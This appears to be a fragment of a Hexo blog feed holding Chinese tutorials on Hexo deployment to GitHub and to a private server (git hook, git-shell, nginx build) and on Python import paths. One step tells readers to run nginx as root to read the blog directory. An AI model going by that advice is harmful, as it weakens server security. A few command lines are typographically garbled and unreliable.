/var/log/le-renew.log看看是否执行正常，如果一切OK，那么我们的配置到此结束！</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>手把手教你在Nginx上使用CertBot    <a href="https://segmentfault.com/a/1190000005797776">https://segmentfault.com/a/1190000005797776</a>   </p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> nginx </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nginx </tag>
            
            <tag> ssl </tag>
            
            <tag> CertBot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo 部署到 github</title>
      <link href="/2017/05/27/Hexo%E9%83%A8%E7%BD%B2%E5%88%B0github/"/>
      <url>/2017/05/27/Hexo%E9%83%A8%E7%BD%B2%E5%88%B0github/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>1,前提： hexo安装OK , node.js 安装OK</p><p>2,准备：2.1 安装GIT ,   2.2 添加ssh key 到Github   2.3  在github添加项目  2.4 修改站点配置文件 _config.yml   2.5 发布流程 </p><p>3，bug修复</p><p>4，访问站点。</p><p><strong>2.1</strong> <strong>安装****git</strong> ,</p><p>安装git ,如果没有安装,则无法连接git 或找不到git ,则需要执行如下命令来安装hexo-deployer-git:</p><p>$npm install hexo-deployer-git –save</p><p>配置<strong>Deployment</strong>首先，你需要为自己配置身份信息，打开命令行，然后输入：</p><ul><li>  <em>git config –global user.name “yourname”</em></li><li>  <em>git config –global user.email “youremail”</em></li><li>  <strong><em>#git config –global user.name “zhuxinkai”</em></strong></li><li>  <strong><em>#git config –global user.email “<a href="mailto:&#x7a;&#x68;&#117;&#x78;&#105;&#x6e;&#107;&#x61;&#105;&#x40;&#x31;&#x32;&#54;&#46;&#x63;&#111;&#x6d;">&#x7a;&#x68;&#117;&#x78;&#105;&#x6e;&#107;&#x61;&#105;&#x40;&#x31;&#x32;&#54;&#46;&#x63;&#111;&#x6d;</a>“</em></strong></li></ul><p>以上做完还不行</p><p>删掉根目录下的文件夹：.deploy_git，重新deploy就可以了。</p><p> 以上是在SSH配置好的前提下</p><p><strong>2.2</strong> <strong>添加****ssh</strong></p><p>2.2.1 首先在自己的环境，生成密钥对。</p><p>1.1.检查SSH keys是否存在Github</p><p>执行如下命令，检查SSH keys是否存在。如果有文件id_rsa.pub或id_dsa.pub，则直接进入步骤1.3将SSH key添加到Github中，否则进入下一步生成SSH key。</p><p>$ ls -al ~/.ssh</p><p>1.2.生成新的ssh key</p><p>执行如下命令生成public/private rsa key pair，注意将<a href="mailto:&#121;&#x6f;&#117;&#114;&#x5f;&#101;&#109;&#x61;&#105;&#x6c;&#64;&#x65;&#120;&#97;&#x6d;&#x70;&#108;&#x65;&#x2e;&#99;&#x6f;&#109;">&#121;&#x6f;&#117;&#114;&#x5f;&#101;&#109;&#x61;&#105;&#x6c;&#64;&#x65;&#120;&#97;&#x6d;&#x70;&#108;&#x65;&#x2e;&#99;&#x6f;&#109;</a>换成你自己注册Github的邮箱地址。</p><p>$ ssh-keygen -t rsa -C “<a href="mailto:&#121;&#111;&#117;&#114;&#x5f;&#101;&#109;&#97;&#x69;&#x6c;&#64;&#x65;&#x78;&#x61;&#109;&#x70;&#108;&#x65;&#x2e;&#x63;&#111;&#109;">&#121;&#111;&#117;&#114;&#x5f;&#101;&#109;&#97;&#x69;&#x6c;&#64;&#x65;&#x78;&#x61;&#109;&#x70;&#108;&#x65;&#x2e;&#x63;&#111;&#109;</a>“</p><p>#ssh-keygen -t rsa -C “<a href="mailto:&#x7a;&#104;&#x75;&#120;&#x69;&#x6e;&#x6b;&#x61;&#105;&#x40;&#49;&#50;&#x36;&#46;&#99;&#x6f;&#x6d;">&#x7a;&#104;&#x75;&#120;&#x69;&#x6e;&#x6b;&#x61;&#105;&#x40;&#49;&#50;&#x36;&#46;&#99;&#x6f;&#x6d;</a>“</p><p>默认会在相应路径下（~/.ssh/id_rsa.pub）生成id_rsa和id_rsa.pub两个文件。</p><p>1.3.将ssh key添加到Github中</p><p>Find前往文件夹~/.ssh/id_rsa.pub打开id_rsa.pub文件，里面的信息即为SSH key，将这些信息复制到Github的Add SSH key页面即可。</p><p>进入Github –&gt; Settings –&gt; SSH keys –&gt; add SSH key:</p><p>Title里任意添一个标题，将复制的内容粘贴到Key里，点击下方Add key绿色按钮即可。</p><p>添加后，在git bash命令输入：</p><p>ssh -T <a href="mailto:&#103;&#x69;&#x74;&#x40;&#x67;&#x69;&#x74;&#x2e;&#99;&#111;&#x64;&#105;&#110;&#x67;&#x2e;&#x6e;&#x65;&#x74;">&#103;&#x69;&#x74;&#x40;&#x67;&#x69;&#x74;&#x2e;&#99;&#111;&#x64;&#105;&#110;&#x67;&#x2e;&#x6e;&#x65;&#x74;</a>    测试公钥配置的有效性，地址该为 github的。这个是coding 的地址。</p><p><strong>2.3</strong> <strong>在github中添加项目</strong></p><p><strong>项目名称遵循后规范：</strong> **(**<strong>你的username)   zhuxinkai+github+io</strong></p><p><strong>2.4</strong> <strong>修改站点配置文件：</strong></p><p><strong>Vim hexo/_config.yml</strong></p><p># Deployment</p><p>## Docs: <a href="https://hexo.io/docs/deployment.html">https://hexo.io/docs/deployment.html</a></p><p>deploy:</p><p>  type: git</p><p>  repository: <a href="mailto:&#103;&#105;&#x74;&#64;&#x67;&#x69;&#x74;&#104;&#117;&#x62;&#x2e;&#99;&#x6f;&#109;">&#103;&#105;&#x74;&#64;&#x67;&#x69;&#x74;&#104;&#117;&#x62;&#x2e;&#99;&#x6f;&#109;</a>:zhuxinkai/zhuxinkai.github.io.git</p><p>  branch: master</p><p><strong>2.5</strong> <strong>发布流程</strong></p><p>#hexo clean</p><p>#hexo generate</p><p>#hexo deploy</p><ol start="3"><li> BUG 修复</li></ol><p>其中遇到两个问题，</p><p>3.1  第一个是 hexo deploy 报错。 其中github 的ssh已经配置正确。  添加如下配置后，正常。    git config -global user.name”zhuxinkai”</p><p>                                                                                                                                                                            git config -global user.email “<a href="mailto:&#x7a;&#x68;&#x75;&#120;&#x69;&#x6e;&#107;&#97;&#x69;&#x40;&#49;&#50;&#x36;&#x2e;&#99;&#111;&#x6d;">&#x7a;&#x68;&#x75;&#120;&#x69;&#x6e;&#107;&#97;&#x69;&#x40;&#49;&#50;&#x36;&#x2e;&#99;&#111;&#x6d;</a>“</p><p>3.2 就是上传成功后找不到域名。</p><p>  zhuxinkai.github.io</p><h1 id="4-访问站点"><a href="#4-访问站点" class="headerlink" title="4, 访问站点"></a>4, 访问站点</h1><p>在浏览器  输入   zhuxinkai.github.io 即可。每次更新文件，需要按照发布流程跑一遍。</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo to your server</title>
      <link href="/2017/05/22/hexo-to-server/"/>
      <url>/2017/05/22/hexo-to-server/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="hexo-to-your-server"><a href="#hexo-to-your-server" class="headerlink" title="hexo-to-your-server"></a>hexo-to-your-server</h1><p>原文(<a href="https://github.com/lawler61/hexo-to-server">https://github.com/lawler61/hexo-to-server</a>)</p><h2 id="一、开始"><a href="#一、开始" class="headerlink" title="一、开始"></a>一、开始</h2><h3 id="配置本地-node-环境"><a href="#配置本地-node-环境" class="headerlink" title="配置本地 node 环境"></a>配置本地 node 环境</h3><ol><li><p><code>node</code>下载 <a href="https://nodejs.org/zh-cn/download/">官网下载</a>，可以的话推荐使用 <code>nvm</code> 安装</p></li><li><p>安装记得把目录改到其他盘，这里我具体是在 <code>D:\programming\nodejs</code></p></li></ol><p><a href="hexo-to-server/node-path.jpg" title="node更换路径" class="gallery-item"><img src="hexo-to-server/node-path.jpg" alt="node更换路径"></a></p><p>打开<code>cmd</code>查看<code>node</code>安装情况</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">node -v<br>npm -v<br></code></pre></td></tr></table></figure><span id="more"></span><ol start="3"><li>配置全局环境</li></ol><p>进入安装目录，创建文件夹<code>node_global</code>和<code>node_cache</code> 并执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm config <span class="hljs-built_in">set</span> prefix <span class="hljs-string">&quot;D:\programming\nodejs\node_global&quot;</span><br>npm config <span class="hljs-built_in">set</span> cache <span class="hljs-string">&quot;D:\programming\nodejs\node_cache&quot;</span><br></code></pre></td></tr></table></figure><p>环境配置：新增环境变量<code>NODE_PATH</code>和添加<code>Path</code>，两个值都为 <code>D:\programming\nodejs\node_global</code></p><p><a href="hexo-to-server/env-node.jpg" title="node更换路径" class="gallery-item"><img src="hexo-to-server/env-node.jpg" alt="node更换路径"></a></p><p><a href="hexo-to-server/env-path.jpg" title="node更换路径" class="gallery-item"><img src="hexo-to-server/env-path.jpg" alt="node更换路径"></a></p><ol start="4"><li>安装<code>hexo-cli</code></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm i hexo-cli -g<br>hexo<br></code></pre></td></tr></table></figure><p>如果显示下面情况，恭喜你成功全局模块调用</p><p><a href="hexo-to-server/test-hexo.jpg" title="node更换路径" class="gallery-item"><img src="hexo-to-server/test-hexo.jpg" alt="node更换路径"></a></p><ol start="5"><li><p>如果出现<code>命令未找到，或不是可执行程序</code>，别着急！<strong>先仔细重复 3-4 步</strong>，一般是能够给解决的，如果实在是不能解决，往后看</p></li><li><p>随便找个地方初始化文件，执行如下命令：</p></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">mkdir hexo-blog<br><span class="hljs-built_in">cd</span> hexo-blog &amp;&amp; npm init -y<br></code></pre></td></tr></table></figure><p>现在有 3 种解决方法，<strong>任选其一</strong></p><ul><li>法 1：检查全局目录是否的<code>hexo</code>模块，执行如下命令：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">D:\programming\nodejs\node_global\hexo<br></code></pre></td></tr></table></figure><ul><li>法 2：如果觉得每次加前缀麻烦，使用<code>link</code>命令链接</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm link hexo<br></code></pre></td></tr></table></figure><p>package.json 中新建脚本如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm run hexo<br></code></pre></td></tr></table></figure><p><a href="hexo-to-server/npm-script.jpg" title="新建npm脚本" class="gallery-item"><img src="hexo-to-server/npm-script.jpg" alt="新建npm脚本"></a></p><ul><li>法 3：你还可以直接在<code>hexo-blog</code>中下载</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm i hexo-cli<br>npm run hexo （还是要在package.json中新建脚本）<br></code></pre></td></tr></table></figure><h3 id="初始化hexo项目"><a href="#初始化hexo项目" class="headerlink" title="初始化hexo项目"></a>初始化<code>hexo</code>项目</h3><ol><li>如果是按照上一节步骤 4 过来的，则在<code>hexo-blog</code>文件下初始化</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo init myblog &amp;&amp; <span class="hljs-built_in">cd</span> myblog<br>npm i<br></code></pre></td></tr></table></figure><ol start="2"><li>下载主题</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/iissnan/hexo-theme-next themes/next<br></code></pre></td></tr></table></figure><p>在<strong>本地配置文件</strong>中设置<code>theme</code>属性</p><p><a href="hexo-to-server/hexo-theme.jpg" title="添加next主题" class="gallery-item"><img src="hexo-to-server/hexo-theme.jpg" alt="添加next主题"></a></p><ol start="3"><li>本地执行<code>hexo</code>项目，添加<code>start</code>脚本</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm start<br></code></pre></td></tr></table></figure><p><a href="hexo-to-server/npm-script-start.jpg" title="新建npm-start脚本" class="gallery-item"><img src="hexo-to-server/npm-script-start.jpg" alt="新建npm-start脚本"></a></p><p>打开 <a href="http://localhost:4000/">http://localhost:4000</a> 验证效果吧</p><h3 id="git环境搭建"><a href="#git环境搭建" class="headerlink" title="git环境搭建"></a><code>git</code>环境搭建</h3><ol><li><p><code>git</code>安装：<a href="https://git-scm.com/downloads">官网下载</a></p></li><li><p>生成<code>ssh</code>认证，执行如下命令</p></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">git config --global user.name <span class="hljs-string">&quot;yourname&quot;</span><br>git config --global user.email youremail@example.com<br>ssh-keygen -t rsa -C <span class="hljs-string">&quot;youremail@example.com&quot;</span><br>git config --global core.autocrlf <span class="hljs-literal">false</span>  // 禁用自动转换，这个不设置后面上传时会出现警告，如下<br></code></pre></td></tr></table></figure><p><a href="hexo-to-server/git-warning.jpg" title="git警告" class="gallery-item"><img src="hexo-to-server/git-warning.jpg" alt="git警告"></a></p><p>最后获取到的<code>ssh</code>认证在<code>C:\Users\yourname\.ssh</code>中</p><hr><h2 id="三、服务器配置"><a href="#三、服务器配置" class="headerlink" title="三、服务器配置"></a>三、服务器配置</h2><h3 id="搭建远程Git私库"><a href="#搭建远程Git私库" class="headerlink" title="搭建远程Git私库"></a>搭建远程<code>Git</code>私库</h3><ol><li><p>登录到远程服务器，推荐使用<code>Xshell 5</code></p></li><li><p>安装 git</p></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git --version // 如无，则安装<br>yum install curl-devel expat-devel gettext-devel openssl-devel zlib-devel perl-devel<br>yum install -y git<br></code></pre></td></tr></table></figure><ol start="3"><li>创建用户并配置其仓库</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">useradd git<br>passwd git // 设置密码<br>su git // 这步很重要，不切换用户后面会很麻烦<br><span class="hljs-built_in">cd</span> /home/git/<br>mkdir -p projects/blog // 项目存在的真实目录<br>mkdir repos &amp;&amp; <span class="hljs-built_in">cd</span> repos<br>git init --bare blog.git // 创建一个裸露的仓库<br><span class="hljs-built_in">cd</span> blog.git/hooks<br>vi post-receive // 创建 hook 钩子函数，输入了内容如下<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br>git --work-tree=/home/git/projects/blog --git-dir=/home/git/repos/blog.git checkout -f<br></code></pre></td></tr></table></figure><p>添加完毕后修改权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">chmod +x post-receive<br><span class="hljs-built_in">exit</span> // 退出到 root 登录<br>chown -R git:git /home/git/repos/blog.git // 添加权限<br></code></pre></td></tr></table></figure><ol start="4"><li>测试<code>git仓库</code>是否可用，另找空白文件夹</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> git@server_ip:/home/git/repos/blog.git<br></code></pre></td></tr></table></figure><p>如果能把空仓库拉下来，就说明 git 仓库搭建成功了</p><p><a href="hexo-to-server/git-clone.jpg" title="git仓库测试" class="gallery-item"><img src="hexo-to-server/git-clone.jpg" alt="git仓库测试"></a></p><ol start="5"><li>建立<code>ssh</code>信任关系，在<strong>本地电脑</strong></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh-copy-id -i C:/Users/yourname/.ssh/id_rsa.pub git@server_ip<br>ssh git@server_ip // 测试能否登录<br></code></pre></td></tr></table></figure><p><strong>注</strong>：此时的 ssh 登录 git 用户不需要密码！否则就<strong>有错</strong>，请仔细重复步骤 3-5</p><ol start="6"><li>为了安全起见禁用 git 用户的 shell 登录权限，从而只能用 git clone，git push 等登录</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">cat /etc/shells // 查看 git-shell 是否在登录方式里面<br><span class="hljs-built_in">which</span> git-shell // 查看是否安装<br>vi /etc/shells<br>添加上2步显示出来的路劲，通常在 /usr/bin/git-shell<br></code></pre></td></tr></table></figure><p>修改<code>/etc/passwd</code>中的权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">// 将原来的<br>git:x:1000:1000::/home/git:/bin/bash<br><br>// 修改为<br>git:x:1000:1000:,,,:/home/git:/usr/bin/git-shell<br></code></pre></td></tr></table></figure><h3 id="搭建nginx服务器"><a href="#搭建nginx服务器" class="headerlink" title="搭建nginx服务器"></a>搭建<code>nginx</code>服务器</h3><ol><li>下载并安装<code>nginx</code></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /usr/<span class="hljs-built_in">local</span>/src<br>wget http://nginx.org/download/nginx-1.15.2.tar.gz<br>tar xzvf nginx-1.15.2.tar.gz<br><span class="hljs-built_in">cd</span> nginx-1.15.2<br>./configure // 如果后面还想要配置 SSL 协议，就执行后面一句！<br>./configure --prefix=/usr/<span class="hljs-built_in">local</span>/nginx --with-http_stub_status_module --with-http_ssl_module --with-file-aio --with-http_realip_module<br>make &amp;&amp; make install<br><span class="hljs-built_in">alias</span> nginx=<span class="hljs-string">&#x27;/usr/local/nginx/sbin/nginx&#x27;</span> // 为 nginx 取别名，后面可直接用<br></code></pre></td></tr></table></figure><ol start="2"><li>配置<code>nginx</code>文件</li></ol><p>先启动是否安装成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nginx // 直接来！浏览器查看 server_ip，默认是 80 端口<br></code></pre></td></tr></table></figure><p>修改配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">nginx -s stop // 先停止nginx<br><span class="hljs-built_in">cd</span> /usr/<span class="hljs-built_in">local</span>/nginx/conf<br>vi nginx.conf<br>修改 root 解析路径，如下图<br>同时将 user 改为 root 如下图，不然nginx无法访问 /home/git/project/blog<br>nginx -s reload<br></code></pre></td></tr></table></figure><p><a href="hexo-to-server/nginx-conf.jpg" title="修改nginx配置" class="gallery-item"><img src="hexo-to-server/nginx-conf.jpg" alt="修改nginx配置"></a></p><p><a href="hexo-to-server/nginx-user.jpg" title="修改nginx user" class="gallery-item"><img src="hexo-to-server/nginx-user.jpg" alt="修改nginx user"></a></p><hr><h2 id="四、发布"><a href="#四、发布" class="headerlink" title="四、发布"></a>四、发布</h2><p>至此我们就把本地和服务器的环境全部搭建完成，现在利用 hexo 配置文件进行链接</p><h3 id="配置-config-yml文件"><a href="#配置-config-yml文件" class="headerlink" title="配置_config.yml文件"></a>配置<code>_config.yml</code>文件</h3><ol><li>编辑 _config.yml 的 deploy 属性</li></ol><p><a href="hexo-to-server/config-deploy.jpg" title="编辑本地deploy" class="gallery-item"><img src="hexo-to-server/config-deploy.jpg" alt="编辑本地deploy"></a></p><ol start="2"><li>在 package.json 中添加 npm 脚本</li></ol><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-string">&quot;scripts&quot;</span>: &#123;<br>  <span class="hljs-attr">&quot;deploy&quot;</span>: <span class="hljs-string">&quot;hexo clean &amp;&amp; hexo g -d&quot;</span>,<br>  <span class="hljs-attr">&quot;start&quot;</span>: <span class="hljs-string">&quot;hexo clean &amp;&amp; hexo g &amp;&amp; hexo s&quot;</span><br>&#125;,<br></code></pre></td></tr></table></figure><ol start="3"><li>链接！这下在本地调试就用<code>npm start</code>，调试好了就上传到服务器，美滋滋~快通过你的服务器 ip 访问吧</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">npm run deploy<br></code></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Git </tag>
            
            <tag> hexo </tag>
            
            <tag> 非原创 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python 中 import 的用法详解</title>
      <link href="/2016/07/22/python%E4%B8%ADimport%E8%AF%A6%E8%A7%A3/"/>
      <url>/2016/07/22/python%E4%B8%ADimport%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h4 id="1-1如何确定import-的优先级路径："><a href="#1-1如何确定import-的优先级路径：" class="headerlink" title="1.1如何确定import 的优先级路径："></a>1.1如何确定import 的优先级路径：</h4><p>比如在不同的相关路径下存在相同名字的模块。<strong>注意在不同的优先级如果有相同的导入模块，那么只有最高优先级的模块起作用！</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> sys<br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span> sys.path<br>[<span class="hljs-string">&#x27;&#x27;</span>, <br><span class="hljs-string">&#x27;C:\\Program Files\\Python37\\python37.zip&#x27;</span>,<br><span class="hljs-string">&#x27;C:\\Program Files\\Python37\\DLLs&#x27;</span>, <br><span class="hljs-string">&#x27;C:\\Program Files\\Python37\\lib&#x27;</span>,<br><span class="hljs-string">&#x27;C:\\Program Files\\Python37&#x27;</span>,<br><span class="hljs-string">&#x27;C:\\Users\\Sampson\\AppData\\Roaming\\Python\\Python37\\site-packages&#x27;</span>, <br><span class="hljs-string">&#x27;C:\\Program Files\\Python37\\lib\\site-packages&#x27;</span><br>]<br><br><br><br><br></code></pre></td></tr></table></figure><h4 id="1-2-路径优先级排序详解"><a href="#1-2-路径优先级排序详解" class="headerlink" title="1.2 路径优先级排序详解"></a>1.2 路径优先级排序详解</h4><ul><li>1.2.1 ‘ ‘  表示当前路径,默认优先级最高。</li><li>1.2.2 /usr/lib/sbin/python/ 来自 /etc/profile 环境变量定义,如果存在，默认优先级第二。<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">vim /etc/profile<br>export PYTHONPATH=/usr/lib/sbin/python/<br>source /etc/profile #每个打开的shell界面都要source起作用<br></code></pre></td></tr></table></figure></li><li>1.2.3 特殊情况，你可以使用sys.path.insert 超越当前路径。 逆袭称为第一，但是只对当前运行脚本起作用。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br>sys.path.insert(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;/home/dev/data&#x27;</span>)<br>reload(sys)  <span class="hljs-comment">#听说加不加都一样</span><br></code></pre></td></tr></table></figure></li><li>1.2.4 屁股后面加一条。添加你的运行环境种其他区域或者路径的模块。默认优先级最低。<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sys<br>sys.path.append(<span class="hljs-string">&#x27;/home/dev/data2&#x27;</span>)<br></code></pre></td></tr></table></figure></li></ul><h4 id="1-3-导入的区别及使用方法的方式。"><a href="#1-3-导入的区别及使用方法的方式。" class="headerlink" title="1.3 导入的区别及使用方法的方式。"></a>1.3 导入的区别及使用方法的方式。</h4><p>以math模块为例。<br>有三种导入方式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> math<br><span class="hljs-keyword">from</span> math <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> math <span class="hljs-keyword">import</span> floor<br></code></pre></td></tr></table></figure><font face="仿宋" color=#2BBC8A>注意到这里没有使用from ... import ...。如果使用了这种import命令，将无法使用常规函 数sqrt。类似这样的名称冲突很隐蔽，因此除非必须使用from版的import命令，否则应坚持使用 常规版import命令</font><h5 id="1-3-1-第一种方法导入的使用，需要在方法前输入模块名。"><a href="#1-3-1-第一种方法导入的使用，需要在方法前输入模块名。" class="headerlink" title="1.3.1 第一种方法导入的使用，需要在方法前输入模块名。"></a>1.3.1 第一种方法导入的使用，需要在方法前输入模块名。</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">math.sqrt(<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><h5 id="1-3-2-第二种方法的导入，及导入模块下所有的方法。容易出现同名方法问题。不精确，也导致工程导入过多代码。"><a href="#1-3-2-第二种方法的导入，及导入模块下所有的方法。容易出现同名方法问题。不精确，也导致工程导入过多代码。" class="headerlink" title="1.3.2 第二种方法的导入，及导入模块下所有的方法。容易出现同名方法问题。不精确，也导致工程导入过多代码。"></a>1.3.2 第二种方法的导入，及导入模块下所有的方法。容易出现同名方法问题。不精确，也导致工程导入过多代码。</h5><h5 id="1-3-3-第三种方法的导入，称为精准导入。。而且可以使用as-避免同名方法问题。"><a href="#1-3-3-第三种方法的导入，称为精准导入。。而且可以使用as-避免同名方法问题。" class="headerlink" title="1.3.3 第三种方法的导入，称为精准导入。。而且可以使用as 避免同名方法问题。"></a>1.3.3 第三种方法的导入，称为精准导入。。而且可以使用as 避免同名方法问题。</h5><p>例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">from</span> cmath <span class="hljs-keyword">import</span> sqrt <span class="hljs-keyword">as</span> csqrt<br><span class="hljs-meta">&gt;&gt;&gt; </span>csqrt(-<span class="hljs-number">1</span>)<br><span class="hljs-number">1j</span><br><br></code></pre></td></tr></table></figure><font face="仿宋" color=#2BBC8A><p>同名方法因为导入的模块不同，而引起的结果不同。<br></font></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> 